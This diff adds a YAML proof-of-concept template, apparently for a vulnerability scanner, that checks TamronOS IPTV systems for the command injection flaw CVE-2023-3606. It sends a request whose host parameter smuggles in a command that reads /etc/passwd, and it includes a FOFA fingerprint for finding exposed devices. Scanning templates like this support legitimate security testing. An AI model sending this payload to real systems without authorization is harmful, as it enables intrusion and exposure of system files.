@@ -1,0 +1,26 @@
+id: poc-yaml-tamronos-iptv-system-command-injection
+info:
+  name: TamronOS IPTV系统  命令注入漏洞(CVE-2023-3606)
+  severity: critical
+  tags:
+  - CVE-2023-3606
+  - 命令注入
+  - 两高一弱
+  finger: TamronOS
+  fofa: app="TamronOS-IPTV系统"
+requests:
+- method: GET
+  path: /api/ping?count=5&host=;cat%20/etc/passwd;
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && contains(body,"cmd")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
